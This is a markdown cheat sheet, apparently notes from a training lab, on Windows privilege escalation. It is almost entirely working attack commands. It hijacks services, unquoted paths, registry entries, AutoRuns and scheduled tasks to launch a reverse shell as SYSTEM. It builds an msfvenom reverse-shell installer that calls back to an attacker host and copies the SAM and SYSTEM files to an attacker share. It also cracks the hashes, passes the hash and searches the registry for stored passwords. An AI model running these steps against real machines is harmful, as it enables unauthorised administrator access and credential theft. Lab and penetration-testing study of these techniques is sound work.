
## Service Exploits -

### Insecure Service Permissions

Use accesschk.exe to check the "user" account's permissions on the application u want using - 
`C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
daclsvc is the application in this example
![](https://i.imgur.com/gs7ez84.png)
The output is like this and the important thing here are the **Change_config and Start and Stop**

Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):
`sc qc daclsvc`

![](https://i.imgur.com/OKxSWtn.png)
Here we can just simply point the **BINARY_PATH_NAME** to our reverse shell so that when the service starts it will run that binary giving us a reverse shell.
`sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`

---
### Unquoted Service Path

In this when the path of the file has spaces or its unquoted we could use it to our advantage as this exploits windows way of handling file paths - 
`sc qc <application>`
![](https://i.imgur.com/BfPck5d.png)

You can now use Accesschk to see whether you have write permissions to that directory - 
`C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" `
![](https://i.imgur.com/it0RjCg.png)
The way to exploit this vulnerability is to place a malicious executable somewhere in the service path, and<strong> name it in a way that starts with the first few letters of the next directory in the service path</strong>. When the service starts, it will then execute the evil binary and grant remote SYSTEM access.

Now we can copy the file - 
`copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`

---
### Weak Registry Permissions 

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
`C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:
`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`

---
### Insecure Service Executables

Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:
`C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:
`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`

---
## Registry Exploits -

### AutoRuns - 

Query the registry for AutoRun executables:
`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:
`C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`

Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:
`copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`

---
### Always Install Elevated 

Query the registry for AlwaysInstallElevated keys:
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

Note that both keys are set to 1 (0x1).

On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`

Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).

Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:
`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

---
### Registry 
The registry can be searched for keys and values that contain the word "password":
`reg query HKLM /f password /t REG_SZ /s`

If you want to save some time, query this specific key to find admin AutoLogon credentials:
`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
`winexe -U 'admin%password' //10.10.1.241 cmd.exe`

---
### Saved Creds
List any saved credentials:
`cmdkey /list`

Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:
`runas /savecred /user:admin C:\PrivEsc\reverse.exe`

---
### SAM 
The SAM and SYSTEM files can be used to extract user password hashes.
Transfer the SAM and SYSTEM files to your Kali VM:

`copy C:\Windows\Repair\SAM \\10.10.10.10\kali\`
`copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\`

On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:
```
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
```
Crack the admin NTLM hash using hashcat:
`hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`

---
### Pass the Hash

Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:
`pth-winexe -U 'admin%hash' //10.10.1.241 cmd.exe`

---
### Scheduled Tasks
The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:
`C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`

Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:

`echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`

---
### Insecure GUI Apps

Run any application if you can that runs with Admin/System Privileges and then you could try to open a file in that app and in the file path bar you could place the command prompt path and get an admin shell.

---
### Startup Apps
Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:

`C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`

Now you could create a startup application or shortcut for the reverse shell and when the system is restarted you would get a reverse shell.

---
https://github.com/itm4n/PrintSpoofer

